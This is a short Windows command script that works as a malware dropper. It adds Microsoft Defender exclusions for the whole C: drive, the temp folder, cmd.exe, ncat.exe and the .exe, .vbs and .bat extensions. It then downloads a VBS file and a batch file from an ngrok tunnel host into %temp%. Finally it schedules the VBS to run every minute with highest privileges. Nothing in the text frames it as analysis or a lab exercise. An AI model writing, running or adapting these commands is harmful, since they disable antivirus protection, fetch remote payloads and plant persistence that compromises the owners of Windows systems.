powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
powershell -Command Add-MpPreference -ExclusionPath "C:\"
powershell -Command Add-MpPreference -ExclusionPath "%temp%"
powershell -Command Add-MpPreference -ExclusionProcess "ncat.exe"
powershell -Command Add-MpPreference -ExclusionProcess "cmd.exe"
powershell -Command Add-MpPreference -ExclusionExtension ".exe"
powershell -Command Add-MpPreference -ExclusionExtension "exe"
powershell -Command Add-MpPreference -ExclusionExtension ".vbs"
powershell -Command Add-MpPreference -ExclusionExtension ".bat"
cd %temp%
curl https://a1.ngrok.dev/e.vbs -o e.vbs
curl https://a1.ngrok.dev/asd123.bat -o asd123.bat

schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
